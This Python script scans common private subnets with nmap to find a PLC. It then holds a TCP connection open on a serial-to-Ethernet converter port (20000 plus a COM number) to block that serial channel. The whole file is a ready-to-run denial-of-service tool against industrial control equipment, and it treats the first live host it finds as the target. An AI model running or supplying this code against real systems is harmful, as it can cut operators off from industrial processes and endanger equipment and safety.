import socket
import time
import subprocess
import re

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by pinging common PLC subnet ranges
    and checking ARP tables.  This is a rudimentary approach and may need
    adjustments for specific network configurations.  This function assumes that the PLC is on the same subnet as the Windows machine.
    """

    # Common PLC subnet ranges (modify as needed)
    subnet_ranges = ["192.168.1.0/24", "192.168.0.0/24", "10.0.0.0/24", "172.16.0.0/12"]

    for subnet in subnet_ranges:
        try:
            # Use nmap to scan the subnet for active hosts. Requires nmap to be installed.
            result = subprocess.run(["nmap", "-sn", subnet], capture_output=True, text=True)
            output = result.stdout

            # Extract IPs from nmap output using regex
            ip_addresses = re.findall(r"Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", output)

            # Check if any IPs were found
            if ip_addresses:
                print(f"Possible PLC IPs found in subnet {subnet}: {ip_addresses}")

                # For demonstration, assume the first IP found is the PLC. In a real-world scenario, 
                # you would need a more reliable method to identify the PLC, such as MAC address filtering,
                # checking open ports known to be used by the PLC, or DNS names.
                plc_ip = ip_addresses[0]
                print(f"Assuming PLC IP is: {plc_ip}")
                return plc_ip
            else:
                print(f"No active hosts found in subnet {subnet}.")

        except FileNotFoundError:
            print("nmap not found. Please install nmap or provide the PLC IP address manually.")
            return None  # Indicate failure to find PLC IP.

        except Exception as e:
            print(f"Error scanning subnet {subnet}: {e}")
            return None  # Indicate failure to find PLC IP.


    print("Could not automatically discover PLC IP. Please provide it manually.")
    return None

def block_serial_com_port(plc_ip, com_port_number):
    """
    Blocks a serial COM port on the PLC's serial-to-Ethernet converter by
    opening and holding a TCP connection to the corresponding port.

    Args:
        plc_ip: The IP address of the serial-to-Ethernet converter (assumed to be the PLC's IP in this simplified example).
        com_port_number: The serial COM port number to block (1, 2, 3, etc.).
    """

    port = 20000 + com_port_number  # Calculate the TCP port number

    try:
        # Create a TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the serial-to-Ethernet converter
        s.connect((plc_ip, port))
        print(f"Successfully connected to {plc_ip}:{port}. Holding connection...")

        # Keep the connection open indefinitely (or until interrupted)
        while True:
            time.sleep(60)  # Sleep for 60 seconds to keep the connection alive

    except socket.error as e:
        print(f"Error blocking port {port}: {e}")
    except KeyboardInterrupt:
        print("Interrupt received, closing connection.")
    finally:
        # Ensure the socket is closed in case of errors or interruption
        if 's' in locals():  # Check if the socket was created
            s.close()
            print(f"Connection to {plc_ip}:{port} closed.")


if __name__ == "__main__":
    # Attempt to find the PLC IP automatically.
    plc_ip = find_plc_ip()

    if not plc_ip:
        # If PLC IP discovery failed, prompt the user for manual entry.
        plc_ip = input("Enter the PLC's IP address: ")
        if not plc_ip:
            print("No PLC IP provided. Exiting.")
            exit()

    com_port_to_block = int(input("Enter the COM port number to block (1, 2, 3, etc.): "))
    block_serial_com_port(plc_ip, com_port_to_block)